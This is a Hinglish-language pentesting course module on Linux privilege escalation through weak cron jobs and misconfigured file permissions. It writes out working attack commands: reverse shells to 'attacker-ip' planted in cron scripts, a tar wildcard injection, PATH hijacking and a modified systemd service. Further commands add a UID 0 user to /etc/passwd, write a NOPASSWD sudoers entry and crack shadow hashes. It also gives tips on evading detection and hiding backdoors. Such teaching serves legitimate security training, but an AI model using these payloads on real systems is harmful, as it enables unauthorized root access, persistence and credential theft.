# **Module 6: Privilege Escalation (Part 2)**

## **Topic 3: Cron Jobs ki Kamzoriyan (Weak Cron Jobs)**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Cron Job Exploitation:** Scheduled tasks ko abuse karke privilege escalation - time-based attacks.

### **2. Ye Kya Hai? (What is it?)**
Cron jobs wo scheduled tasks hain jo automatically specific time par run hote hain. Agar cron job misconfigured hai (writable script, PATH issues), to privilege escalation possible hai.

**Analogy:** Cron job ek automatic alarm hai jo har din specific time par kuch kaam karta hai. Agar alarm ki settings weak hain, to aap alarm ko modify karke apna kaam karwa sakte hain jab wo trigger ho.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Root cron jobs = root access opportunity
- Writable scripts exploit karna
- PATH hijacking in cron
- Wildcard injection
- Reliable privilege escalation

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Enumeration phase mein
- Jab writable files milein
- System par kuch time wait kar sakte ho
- Automated tasks identify karne par

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Time-based privilege escalation miss ho jayega. Writable cron scripts exploit nahi kar payenge. Easy root access opportunities gawa denge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Cron Enumeration:**
```bash
# System-wide cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/

# User cron
crontab -l
crontab -u username -l

# Running processes (cron jobs)
ps aux | grep cron

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

**Cron Format:**
```
* * * * * command
â”‚ â”‚ â”‚ â”‚ â”‚
â”‚ â”‚ â”‚ â”‚ â””â”€ Day of week (0-7)
â”‚ â”‚ â”‚ â””â”€â”€â”€ Month (1-12)
â”‚ â”‚ â””â”€â”€â”€â”€â”€ Day of month (1-31)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€ Hour (0-23)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0-59)
```

**Common Exploits:**
1. **Writable Script:** Script ko modify karke reverse shell
2. **PATH Hijacking:** Relative commands abuse
3. **Wildcard Injection:** `tar *` jaise commands
4. **File Overwrite:** Cron output redirect abuse

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Cron enumeration**
```bash
cat /etc/crontab
```

**Expected Output:**
```
*/5 * * * * root /usr/local/bin/backup.sh
```

**Scenario 2: Writable script check**
```bash
ls -la /usr/local/bin/backup.sh
```

**Output:** `-rwxrwxrwx 1 root root` (Writable by all!)

**Scenario 3: Script modification**
```bash
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' >> /usr/local/bin/backup.sh
```

**Scenario 4: Wildcard injection**

Agar cron: `tar czf /backup.tar.gz *`

```bash
cd /target/directory
echo 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

**Scenario 5: PATH hijacking**

Agar cron: `backup` (bina full path)

```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > /tmp/backup
chmod +x /tmp/backup
# Wait for cron to run with /tmp in PATH
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `/etc/crontab` check karna bhoolna
- Writable scripts ko overlook karna
- Cron timing ko ignore karna (wait karna padta hai)
- Wildcard injection opportunities miss karna
- User crontabs check na karna

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Hamesha `/etc/crontab` aur `/etc/cron.d/*` check karein
- **Stealth Tip:** Pspy tool use karein running processes monitor karne ke liye
- Writable scripts mein original content preserve karein (detection avoid)
- Cron timing note karein - kitni der wait karna padega
- Backup listener ready rakhein reverse shell ke liye

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne `/etc/crontab` check kiya aur dekha ki root user har 5 minute mein `/opt/cleanup.sh` run kar raha hai. Script check ki - world-writable thi! Usne script ke end mein reverse shell payload add kiya, 5 minute wait kiya, aur root shell mil gaya.

Dusre case mein, cron job `tar czf backup.tar.gz *` use kar rahi thi. Pentester ne wildcard injection kiya, malicious checkpoint actions create kiye, aur jab cron run hua to root shell execute ho gaya.

### **11. Checklist / Chota Recap (TL;DR)**
- `cat /etc/crontab` - System cron check
- `ls -la /etc/cron.*` - Cron directories
- Writable scripts = Easy win
- Wildcard injection powerful technique
- Pspy tool for process monitoring

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Cron jobs kaise identify karein?**
A: `/etc/crontab`, `/etc/cron.d/`, `crontab -l`, aur pspy tool se.

**Q2: Writable cron script mili, ab kya?**
A: Reverse shell payload add karein, listener start karein, cron run hone ka wait karein.

**Q3: Wildcard injection kya hai?**
A: Jab cron `*` use kare (jaise `tar *`), to aap filenames se command inject kar sakte hain.

**Q4: Cron kitni der mein run hoga?**
A: Crontab entry dekh kar timing calculate karein. `*/5` = har 5 minute.

**Q5: Pspy kya hai?**
A: Tool jo bina root ke running processes monitor karta hai - cron jobs identify karne ke liye perfect.

### **13. Practice ke liye Task**
1. `cat /etc/crontab` - System cron check
2. `ls -la /etc/cron.daily/` - Daily cron scripts
3. Test: `echo '* * * * * echo "test" > /tmp/crontest' | crontab -`
4. `watch -n 1 cat /tmp/crontest` - Monitor
5. `crontab -r` - Remove test cron

**Expected Output:** Har minute "test" file update hogi.

### **14. Extra / Advanced Jaankari (Optional)**
- **Pspy:** `https://github.com/DominicBreuker/pspy`
- **Systemd Timers:** Modern alternative to cron
- **Anacron:** For systems not always on
- **Cron.allow/deny:** Access control files

### **15. Aakhri Choti Summary (5 lines)**
- Cron jobs scheduled tasks hain jo automatically run hote hain
- Writable cron scripts easy privilege escalation
- Wildcard injection powerful technique
- PATH hijacking possible agar relative paths use ho
- Pspy tool cron jobs identify karne ke liye

> **Ye Zaroor Yaad Rakhein**
> 1. `/etc/crontab` hamesha check karein
> 2. Writable scripts = instant root
> 3. Wildcard `*` = injection opportunity
> 4. Timing important - wait karna padta hai
> 5. Pspy tool download karein

---

## **Topic 4: Weak File Permissions on Services/Configs**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Weak File Permissions:** Misconfigured file permissions ko exploit karna - low-hanging fruits.

### **2. Ye Kya Hai? (What is it?)**
Weak file permissions matlab important files (configs, services, scripts) par galat permissions jo unauthorized modification allow karte hain. Ye privilege escalation ka easy aur common vector hai.

**Analogy:** Ye aise hai jaise bank ki tijori ki chabi sabko mil jaaye. Agar important files (tijori) ki permissions weak hain, to koi bhi unhe modify kar sakta hai aur system compromise ho sakta hai.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Easy privilege escalation
- Config files modify karke backdoor
- Service files hijack karna
- Password files access karna
- Quick wins in pentesting

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Initial enumeration mein
- Jab writable files dhoondhni ho
- Config files analyze karte waqt
- Service enumeration ke dauran

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Easiest privilege escalation vectors miss ho jayenge. Writable configs exploit nahi kar payenge. Quick wins gawa denge. Pentesting time waste hoga.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Enumeration Commands:**
```bash
# World-writable files
find / -writable -type f 2>/dev/null
find / -perm -2 -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null

# Files owned by current user
find / -user $(whoami) 2>/dev/null

# Writable /etc files (critical)
find /etc -writable 2>/dev/null

# Writable service files
find /etc/systemd/system -writable 2>/dev/null
find /lib/systemd/system -writable 2>/dev/null

# Readable sensitive files
ls -la /etc/shadow
ls -la /etc/sudoers
ls -la /root/.ssh/
```

**Common Targets:**
- `/etc/passwd` - User database
- `/etc/shadow` - Password hashes
- `/etc/sudoers` - Sudo config
- `/etc/systemd/system/*.service` - Service files
- `/etc/cron.d/*` - Cron jobs
- `/root/.ssh/authorized_keys` - SSH keys
- Config files in `/etc/`

**Exploitation Techniques:**
1. **Writable /etc/passwd:** Add root user
2. **Writable service file:** Modify ExecStart
3. **Writable sudoers:** Add NOPASSWD entry
4. **Writable SSH keys:** Add your public key

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Writable files enumeration**
```bash
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
```

**Scenario 2: Writable /etc/passwd**
```bash
ls -la /etc/passwd
```

**Output:** `-rw-rw-rw- 1 root root` (World-writable!)

**Exploitation:**
```bash
openssl passwd -1 -salt hack password123
# Output: $1$hack$hash...

echo 'hacker:$1$hack$hash:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su hacker
# Password: password123
```

**Scenario 3: Writable service file**
```bash
find /etc/systemd/system -writable 2>/dev/null
```

**Output:** `/etc/systemd/system/myservice.service`

**Exploitation:**
```bash
cat > /etc/systemd/system/myservice.service << EOF
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl start myservice
```

**Scenario 4: Writable sudoers.d**
```bash
echo 'username ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/username
sudo su
```

**Scenario 5: Readable /etc/shadow**
```bash
cat /etc/shadow | grep root
# Copy hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `/proc` aur `/sys` ko filter na karna (false positives)
- Writable files ko systematically check na karna
- `/etc/passwd` format galat likhna
- Service files modify ke baad `daemon-reload` bhoolna
- Backup na lena modification se pehle

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Output ko file mein save karein: `find ... > writable.txt`
- **Stealth Tip:** Original content preserve karein detection avoid karne ke liye
- `/etc` directory ko priority dein - sabse sensitive files yahan
- Writable config files mein backdoor subtle rakhein
- LinPEAS tool use karein automated enumeration ke liye

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne enumeration kiya aur dekha ki `/etc/passwd` world-writable hai (admin ki galti). Usne ek naya user add kiya UID 0 ke saath (root equivalent), password set kiya, aur `su` se switch karke root access le liya. Phir usne `/etc/shadow` se saare password hashes extract kar liye.

Dusre case mein, `/etc/systemd/system/` mein ek service file writable thi. Pentester ne service ko modify kiya reverse shell execute karne ke liye, service restart ki, aur root shell mil gaya.

### **11. Checklist / Chota Recap (TL;DR)**
- `find / -writable 2>/dev/null` - Writable files
- `/etc/passwd` writable = Add root user
- Service files writable = Modify ExecStart
- `/etc/sudoers.d/` writable = Add NOPASSWD
- LinPEAS for automated checks

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Writable /etc/passwd se kaise exploit karein?**
A: Naya user add karein UID 0 ke saath: `username:password_hash:0:0::/root:/bin/bash`

**Q2: Password hash kaise generate karein?**
A: `openssl passwd -1 -salt xyz password` ya `mkpasswd -m sha-512 password`

**Q3: Service file modify karne ke baad kya karein?**
A: `systemctl daemon-reload` phir `systemctl restart service`

**Q4: LinPEAS kya hai?**
A: Automated Linux privilege escalation enumeration script - sabse popular tool.

**Q5: Writable files bahut zyada hain, kahan focus karein?**
A: `/etc/`, `/root/`, service files, cron files - ye priority targets.

### **13. Practice ke liye Task**
1. `find /etc -writable 2>/dev/null` - Writable /etc files
2. `ls -la /etc/passwd /etc/shadow` - Permissions check
3. `find /etc/systemd -writable 2>/dev/null` - Service files
4. Download LinPEAS: `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
5. `chmod +x linpeas.sh && ./linpeas.sh` - Run

**Expected Output:** Detailed enumeration report with color-coded findings.

### **14. Extra / Advanced Jaankari (Optional)**
- **LinPEAS:** Most comprehensive enumeration tool
- **Linux Smart Enumeration (LSE):** Alternative to LinPEAS
- **Linux Exploit Suggester:** Kernel exploit recommendations
- **Capabilities:** `getcap -r / 2>/dev/null`

### **15. Aakhri Choti Summary (5 lines)**
- Weak file permissions easy privilege escalation vector
- `/etc/passwd` writable = instant root user
- Service files modify karke root shell
- LinPEAS automated enumeration ke liye best
- Hamesha `/etc/` directory ko priority dein

> **Ye Zaroor Yaad Rakhein**
> 1. `find / -writable` writable files dhoondhta hai
> 2. `/etc/passwd` writable = game over
> 3. Service files = ExecStart modify
> 4. LinPEAS download karein aur use karein
> 5. `/etc/` directory most sensitive

---

## **Module 6 Complete Takeaway**

Is module mein humne privilege escalation ke 4 powerful techniques seekhe:
1. **Sudo Exploitation** - `sudo -l` check karke GTFOBins se exploit
2. **SUID/SGID** - Root-owned binaries dhoondhna aur exploit karna
3. **Cron Jobs** - Writable scripts aur wildcard injection
4. **Weak Permissions** - Misconfigured files ko abuse karna

Ye sab techniques real-world pentesting mein daily use hoti hain. LinPEAS jaise automated tools help karte hain, lekin manual enumeration skills bhi zaroori hain. Practice karte rahein - har system mein kuch na kuch misconfiguration hoti hai jo privilege escalation allow karti hai.

**Next:** Module 7 mein post-exploitation aur lateral movement seekhenge! ðŸš€

